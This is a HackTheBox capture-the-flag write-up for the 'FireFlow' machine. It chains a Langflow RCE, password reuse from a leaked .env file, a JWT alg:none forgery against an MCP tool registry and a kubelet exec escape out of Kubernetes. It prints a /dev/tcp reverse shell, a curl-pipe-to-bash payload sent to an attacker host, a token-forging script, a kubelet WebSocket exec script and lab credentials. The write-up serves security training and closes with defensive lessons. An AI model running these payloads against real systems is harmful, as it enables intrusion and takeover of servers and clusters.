---
title: "FireFlow"
type: docs
tags:
  - htb
  - linux
  - medium
  - langflow
  - cve-2026-33017
  - unauthenticated-rce
  - vhost-fuzzing
  - ffuf
  - env-file-leak
  - password-reuse
  - jwt
  - alg-none
  - token-forgery
  - mcp
  - kubernetes
  - rbac-misconfiguration
  - service-account-token
  - kubelet-exec
  - hostpath-mount
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux, **Difficulty:** Medium, **IP:** `10.129.244.214`, `fireflow.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `ffuf` vhost fuzzing turns up `flow.fireflow.htb`, a **Langflow** instance. Registration is open, but new accounts sit in a pending-approval state, so the way in has to be unauthenticated rather than a normal login.
2. Langflow's flow-build endpoint is vulnerable to **CVE-2026-33017**, an unauthenticated RCE where a supplied flow definition is executed server side instead of the one already stored. A flow ID scraped from the public marketing site is enough to trigger it. Shell as **`www-data`**.
3. `/etc/langflow/.env`, group-readable by `www-data`, leaks `LANGFLOW_SUPERUSER_PASSWORD`. That password is reused by the local user **`nightfall`**. `su nightfall` for `user.txt`.
4. `nightfall`'s `~/.mcp/config.json` holds credentials for an internal **MCP AI Tool Registry** on `:30080`, only reachable from inside the host. Pivot in with `chisel` and `proxychains`.
5. The registry's JWT verification accepts **`alg: none`**. A forged, unsigned token with the role bumped to `admin` registers a malicious MCP "tool" whose Python body runs on invocation, unauthenticated **RCE inside the `mcp-server` Kubernetes pod**.
6. That pod's mounted service account token is scoped to `get nodes/proxy` only, but that is enough to enumerate pods through the kubelet and find a privileged `node-exporter` pod with the host filesystem bind mounted in. The API server refuses `pods/exec` for this token, but the kubelet's raw WebSocket exec endpoint on `:10250` accepts the same token anyway. Exec in as root, read `root.txt` off the underlying node through the mount.

</div>

<div class="callout callout-key">

**Credentials and Flags**

| Where | Value |
| --- | --- |
| Langflow superuser, reused for `nightfall` | `langflow : n1ghtm4r3_b4_n1ghtf4ll` |
| Langflow JWT signing key (`.env` / `secret_key`) | `XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE` |
| MCP tool registry (`~/.mcp/config.json`) | `langflow-bot : Langfl0w@mcp2026!` |
| `user.txt` | `/home/nightfall/user.txt` |
| `root.txt` | `/root/root.txt` (read through the node-exporter pod's host mount) |

</div>

---

## Overview

FireFlow is a fast-moving chain from a brand-new N-day straight into cloud-native infrastructure. A very recent, very loud Langflow RCE gets the door open, a leaked `.env` password walks me sideways into a real user account, and then the box turns into something most HTB machines never touch: an internal microservice registry with a broken JWT implementation, sitting in front of a Kubernetes cluster whose RBAC looks minimal on paper but forwards straight through to the kubelet. The lesson that travels the furthest here is the last one: a lone `get nodes/proxy` permission looks harmless next to the usual "list pods, read every secret" over-grants, but it is a pivot primitive in disguise, and a "read-only" monitoring pod with the host filesystem mounted in is a root shell waiting for anyone who can exec into it.

Related JWT / signed-token forgery: [BackFire](/writeups/hackthebox/linux/medium/backfire/), and the hash-based version of the same idea in [Ouija](/writeups/hackthebox/linux/insane/ouija/). Related container and capability escalation: [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Wifinetic](/writeups/hackthebox/linux/easy/wifinetic/). Related "a shared mount runs your code as a more privileged identity": [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/).

---

## Full Walkthrough

### Recon

```bash
Nmap scan report for fireflow.htb (10.129.244.214)
Host is up, received user-set (0.020s latency).
Scanned at 2026-09-01 03:39:57 EDT for 259s
Not shown: 992 closed tcp ports (conn-refused)
PORT      STATE    SERVICE   REASON      VERSION
22/tcp    open     ssh       syn-ack     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| vulners: [output trimmed - CVE reference dump]
443/tcp   open     ssl/http  syn-ack     nginx
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| http-headers: 
|   Server: nginx
|   Date: Tue, 01 Sep 2026 07:39:50 GMT
|   Content-Type: text/html
|   Content-Length: 12913
|   Last-Modified: Thu, 30 Apr 2026 09:55:55 GMT
|   Connection: close
|   ETag: "69f3272b-3271"
|   X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
|   X-Content-Type-Options: nosniff
|   Referrer-Policy: strict-origin-when-cross-origin
|   Accept-Ranges: bytes
|   
|_  (Request type: HEAD)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.tenable.com/plugins/nessus/55976
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
9100/tcp  filtered jetdirect no-response
30000/tcp filtered ndmps     no-response
30718/tcp filtered unknown   no-response
30951/tcp filtered unknown   no-response
31038/tcp filtered unknown   no-response
31337/tcp filtered Elite     no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The X-Frame-Options header giving away `flow.fireflow.htb` before I have even looked for it is a nice freebie, but I still run a proper vhost sweep rather than trust one header, since real engagements rarely hand you the whole picture in a single line. First move on any web box: fuzz for subdomains with `ffuf` before spending time clicking around the one site nmap pointed at.

```bash
└─[$] ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.fireflow.htb" -u 'https://fireflow.htb/' -c  --fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 52ms]
```

Navigating to `https://flow.fireflow.htb` lands on a Langflow instance, and the name alone already tells me where this is probably going: Langflow has had a rough run of critical CVEs recently, so an N-day is a strong first bet before I go looking for anything bespoke. Registration is open, so I register an account, but logging back in immediately throws an error that the account is pending admin approval. That rules out the "just log in and go" route entirely, so whatever gets me in has to be an unauthenticated exploit against Langflow itself, not the registration flow.

### Initial Access, Langflow RCE (CVE-2026-33017)

<div class="callout callout-note">

**CVE-2026-33017**

Langflow's flow-build endpoint (`POST /api/v1/build_public_tmp/{flow_id}/flow`) is meant to render the flow that is already stored server side for that ID, but an optional `data` parameter on the request lets a caller supply their own flow JSON instead, and the server happily builds and runs that one rather than the stored copy. Node "code" inside a Langflow flow is just Python that gets handed to `exec()`, so a forged flow containing a malicious code node is unauthenticated remote code execution. It affects every Langflow release before 1.9.0.

</div>

The pending-approval wall confirms there's no normal user path in, so I pull a public PoC for CVE-2026-33017. Exploiting it still needs a valid flow ID, which I have no dashboard access to browse for, but the primary marketing site at `https://fireflow.htb` links out to a demo flow, and the ID sits right there in the URL.

```bash
└─[$] python3 CVE-2026-33017.py --url https://flow.fireflow.htb --flow 7d84d636-af65-42e4-ac38-26e867052c25 --host 10.10.17.59 --port 9001
[*] Target URL: https://flow.fireflow.htb
[*] Flow ID: 7d84d636-af65-42e4-ac38-26e867052c25
[*] Callback: 10.10.17.59:9001
[*] Command: bash -i >& /dev/tcp/10.10.17.59/9001 0>&1
```

Landing a shell as `www-data`, one of the first things I check for is anything I can write to that a more privileged process might later touch, and `/opt/langflow` stands out immediately: it holds the application's Python virtual environment, and `www-data` owns the whole tree.

```bash
(remote) www-data@fireflow:/opt/langflow$ ls -aril
total 12
786455 drwxr-xr-x 7 www-data www-data 4096 Apr  9 14:36 venv
786434 drwxr-xr-x 5 root     root     4096 Apr  9 17:35 ..
786454 drwxr-xr-x 3 www-data www-data 4096 Apr  9 14:24 .
(remote) www-data@fireflow:/opt/langflow$ 
```

A writable venv owned by the web user is a classic setup for a supervisor-triggered privilege escalation (poison a package, wait for a root-run process to import it), so I file it away as a fallback. It turns out I don't need it, the real privesc is sitting in plain text one directory tree over.

### Privilege escalation to nightfall

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 337 May  7 23:30 /etc/langflow/.env
```

`linpeas` flags `/etc/langflow/.env` as group-readable by `www-data`, and that file hands over both a superuser password for the Langflow application and its signing key in one shot.

```bash
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

`LANGFLOW_SUPERUSER_PASSWORD` is exactly the kind of value that ends up reused between an application account and a real system login, so before trying anything more elaborate I just throw it at the only other named user I've seen so far.

```bash
(remote) www-data@fireflow:/tmp$ su nightfall
Password: 
nightfall@fireflow:/tmp$ cd
nightfall@fireflow:~$ ls
user.txt
nightfall@fireflow:~$ cat user.txt 
f4281061f7e6ea83778d7b2687ce362e
nightfall@fireflow:~$ 
```

It works on the first try, straight credential reuse from an application config file into a login shell, and `user.txt` is sitting right there.

While I'm in `/var/lib/langflow` I confirm the secret key from the `.env` file is still the live one the app signs its tokens with:

```bash
(remote) www-data@fireflow:/var/lib/langflow$ cat secret_key 
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

### Pivoting to the internal MCP tool registry

Requesting bearer cookie from found local langflow instance turns up something more interesting than the langflow config itself: `nightfall`'s home directory holds a `.mcp` folder with connection details for a service I haven't touched yet, an internal MCP (Model Context Protocol) tool registry.

```bash
nightfall@fireflow:~/.mcp$ cat config.json 
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Port `30080` never showed up in the original nmap sweep, which means it's only reachable from inside the host, not from my attacking box directly. I pivot in through `nightfall`'s shell with `chisel`, standing a SOCKS listener up on my side and dialing back into it from the target.

```bash
└─[$] ./chisel_1.9.1_linux_amd64 server -p 8888 --socks5 --reverse                                               [4:42:18]
2026/09/01 04:42:22 server: Reverse tunnelling enabled
2026/09/01 04:42:22 server: Fingerprint MpgpIBU8SLIMEBK7w51/7yuwQWTBQAy72kp06DKm6BU=
2026/09/01 04:42:22 server: Listening on http://0.0.0.0:8888
2026/09/01 04:42:35 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
nightfall@fireflow:~$ ./chisel_1.9.1_linux_amd64 client 10.10.17.59:8888 R:socks
2026/09/01 08:42:11 client: Connecting to ws://10.10.17.59:8888
2026/09/01 08:42:11 client: Connected (Latency 35.020313ms)
```

With the tunnel up, `proxychains` lets any tool on my box route through that SOCKS proxy as if I were sitting on `fireflow.htb` itself. I authenticate to the MCP registry with the credentials from `config.json`:

```bash
─[$] proxychains curl -s -X POST http://127.0.0.1:30080/api/v1/auth \                      [5:27:44]
     -H 'Content-Type: application/json' \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'     

ProxyChains-3.1 (http://proxychains.sf.net)
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}%  
```

### Forging an admin token (JWT alg:none)

<div class="callout callout-note">

**Why `alg: none` still matters**

The JWT spec allows an unsecured token with the algorithm field set to `none` and no signature at all, a leftover for cases where a token's integrity is guaranteed some other way. Plenty of JWT libraries reject it by default, but plenty of home-grown or loosely configured verifiers just read whatever `alg` the *client* sends and act on it, in which case a client can hand back a completely unsigned token with any claims it likes and the server will trust it exactly as much as a properly signed one.

</div>

The token that comes back is `HS256`, but before assuming the server actually enforces that, I always test whether it also honors `alg: none`. I wrote a small PoC to check it directly against an endpoint that's supposed to require auth:

```python
import base64
import requests

server_url = "http://10.129.244.214:30080"
target_endpoint = f"{server_url}/api/v1/version" # Your status endpoint

# 1. Craft a forged JWT header with algorithm 'none'
header = '{"alg":"none","typ":"JWT"}'
# 2. Craft a forged payload impersonating the 'langflow-bot' user
payload = '{"sub":"langflow-bot"}'

def urlsafe_b64encode(string):
    return base64.urlsafe_b64encode(string.encode()).decode().rstrip("=")

encoded_header = urlsafe_b64encode(header)
encoded_payload = urlsafe_b64encode(payload)

# A 'none' algorithm token has no signature, but must end with a trailing dot
forged_token = f"{encoded_header}.{encoded_payload}."

# 3. Send the request to test the vulnerability
headers = {
    "Authorization": f"Bearer {forged_token}"
}

print(f"Testing forged token: {forged_token}")
response = requests.get(target_endpoint, headers=headers)

if response.status_code == 200:
    print("\n[!] CRITICAL VULNERABILITY DETECTED: The server accepted 'alg: none'!")
    print(f"Response: {response.text}")
else:
    print(f"\n[+] Secure: The server rejected the 'none' token (Status: {response.status_code}).")
```

```bash
ProxyChains-3.1 (http://proxychains.sf.net)
Testing forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QifQ.

[!] CRITICAL VULNERABILITY DETECTED: The server accepted 'alg: none'!
Response: {"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp                        [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools               [admin]"]}
```

The service's own endpoint listing spells out exactly what I want next, `POST /api/v1/tools` is marked `[admin]`. Since the server doesn't actually check the signature, I don't need to forge a valid HMAC at all, I just need a payload it will trust. To do this we request a token from the server then in `jwt.io` we can edit the variable `user` to `admin`, matching the claim shape the server already produced but with `alg` set to `none` and the role bumped up.

```bash
 proxychains curl -s -X POST http://127.0.0.1:30080/api/v1/auth \                      [5:35:45]
     -H 'Content-Type: application/json' \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'

ProxyChains-3.1 (http://proxychains.sf.net)
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}%  
```

With an admin-scoped, signature-free token in hand, `/api/v1/tools` lets an admin register a new MCP tool, and a "tool" here is nothing more than a name, a description, and a block of Python that runs whenever it's invoked. I created the following payload in order to get command execution on the target.

```json
{
  "name": "shell",
  "description": "Baphomets Reverse Shell",
  "code": "import os\nos.system('curl http://10.10.17.59:8000/shell.sh | bash')"
}
```

Then we upload it.

```bash
proxychains curl -s -X POST http://10.129.244.214:30080/api/v1/tools -H 'Content-Type: application/json' -H "Authorization: Bearer $ADMIN_JWT" --data-binary @baphomet.json
ProxyChains-3.1 (http://proxychains.sf.net)
{"status":"registered","name":"shell"}%
```

### Root, escaping the pod through a Kubernetes RBAC gap

Registering the tool with the forged admin token goes through without complaint, and the registry's own invocation path runs it moments later. A reverse shell lands, but not back on the web host I started from, it comes in on a completely separate workload: `mcp-server-54464cb475-29ztf`. The pod-style hostname, a `/var/run/secrets/kubernetes.io/serviceaccount` directory, and a handful of `KUBERNETES_*` environment variables all say the same thing: this box's back end isn't a single VM, it's a small Kubernetes cluster, and I've just landed inside one of its pods.

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ ls /var/run/secrets/kubernetes.io/serviceaccount
ca.crt  namespace  token
mcp@mcp-server-54464cb475-29ztf:/app$ env | grep -i kubernetes
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_SERVICE_PORT=443
```

<div class="callout callout-note">

**Service account tokens and `nodes/proxy`**

Every pod that isn't explicitly opted out gets a service account token auto-mounted at that path, and whatever RBAC role is bound to that service account is exactly what a shell inside the pod can do against the API server. First move is always the same: ask the API what I'm actually allowed to do with this token before trying to enumerate blind.

</div>

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://10.43.0.1:443

curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

```console
"resourceRules": [
  {"verbs": ["get"], "apiGroups": [""], "resources": ["nodes/proxy"]}
]
```

A single `get nodes/proxy` rule doesn't look like much next to the usual "list every pod, read every secret" over-grants, but `nodes/proxy` forwards a request straight to the target node's kubelet, and the kubelet exposes its own API on port 10250, pod listings, logs, and in some configurations command execution. Once I can reach a kubelet directly, the API server's RBAC stops being the only gate, because the kubelet enforces its own authorization for the same bearer token, and it isn't always as strict.

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$API/api/v1/nodes/fireflow/proxy/pods" | python3 -m json.tool | grep -B2 -A6 node-exporter
```

```console
"name": "prometheus-prometheus-node-exporter-nmntq",
"namespace": "monitoring",
"hostPID": true,
"hostNetwork": true,
"containers": [{
  "name": "node-exporter",
  "volumeMounts": [{"mountPath": "/host/root", "name": "root"}]
}]
```

<div class="callout callout-note">

**Why a monitoring pod is a root shell in disguise**

Prometheus's node-exporter is designed to read host-level metrics, so it's routinely deployed with `hostPID`, `hostNetwork`, and the entire host filesystem bind mounted into the container, here at `/host/root`. That's completely unremarkable for a monitoring stack. It is also, from where I'm sitting, a root shell wearing a disguise: anything I execute inside that container runs as root and can reach the whole node's filesystem through the mount.

</div>

I try the obvious path first, asking the API server to exec into it directly:

```bash
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/namespaces/monitoring/pods/prometheus-prometheus-node-exporter-nmntq/exec?container=node-exporter&command=id&stdout=true&stderr=true"
```

```console
{"kind":"Status","status":"Failure","reason":"Forbidden","message":"pods/exec is forbidden"}
```

Consistent with the rules review: `pods/exec` was never in the grant, only `nodes/proxy` was. But the kubelet on port 10250 serves its own raw WebSocket exec endpoint, and it authorizes the bearer token independently of the API server's RBAC path. If the kubelet's own authorization is looser, which on this box it is, the same token the API server just refused for `pods/exec` still opens a shell when I talk to the kubelet directly instead of going through the front door.

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE  = "10.129.244.214"
NS    = "monitoring"
POD   = "prometheus-prometheus-node-exporter-nmntq"
CNT   = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def kube_exec(cmd):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = (f"wss://{NODE}:10250/exec/{NS}/{POD}/{CNT}"
           f"?output=1&error=1&command={cmd}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"]
    ) as ws:
        while True:
            data = await ws.recv()
            if isinstance(data, bytes) and len(data) > 1:
                sys.stdout.write(data[1:].decode(errors="replace"))

asyncio.run(kube_exec(sys.argv[1] if len(sys.argv) > 1 else "id"))
```

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 kube_exec.py id
uid=0(root) gid=65534(nobody) groups=65534(nobody)
```

No RBAC check at all on that path, the kubelet just runs it, and it drops me straight into the `node-exporter` container as root. From there the host mount does the rest:

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 kube_exec.py "cat /host/root/root/root.txt"
```

`cat /host/root/root/root.txt` returns the 32-character flag for this instance. The container's host-root bind mount makes the underlying node's filesystem directly readable, so root's flag on the real `fireflow.htb` host comes back through a monitoring pod that a `get nodes/proxy` grant was never supposed to let me reach.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/nightfall/user.txt` |
| `root.txt` | `/root/root.txt` (read via the privileged `node-exporter` pod's host mount) |

---

## Lessons and Takeaways

- **Patch fast on AI-tooling stacks.** Langflow's build-and-execute-a-flow design is remote code execution by definition the moment authentication or input validation slips, and CVE-2026-33017 saw exploitation in the wild within about a day of disclosure.
- **One leaked `.env` is every account that shares its password.** A superuser password for an application and the password for a real system login should never be the same string.
- **Verify the algorithm, not just the presence of a signature.** Any JWT verifier that still honors `alg: none`, or lets the caller pick the algorithm at all, is forgeable without ever touching the key. Pin the expected algorithm server side and reject everything else outright.
- **Scope RBAC to what a workload actually does.** A lone `get nodes/proxy` rule reads as harmless until you remember it forwards to the kubelet's own API. Audit ClusterRoles for anything touching `nodes/proxy`, it is functionally a kubelet-reach grant.
- **Lock down the kubelet independently of the API server.** `--authorization-mode=Webhook` and disabling anonymous auth on the API server means nothing if the same bearer token the API server refuses for `pods/exec` is still accepted directly by the kubelet's raw exec endpoint. Test both paths, not just one.
- **Don't run a full read-write host mount on a monitoring workload** unless the node it lands on is exactly as trusted as anything else with root, because functionally, it now is.

---

## Related Writeups

- **JWT / signed-token forgery:** [BackFire](/writeups/hackthebox/linux/medium/backfire/), [Ouija](/writeups/hackthebox/linux/insane/ouija/)
- **Container and Linux capability escalation:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Wifinetic](/writeups/hackthebox/linux/easy/wifinetic/)
- **Shared mounts running attacker code as a more privileged identity:** [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/)

## References

- Final privilege escalation steps cross-referenced against public writeups for this box.
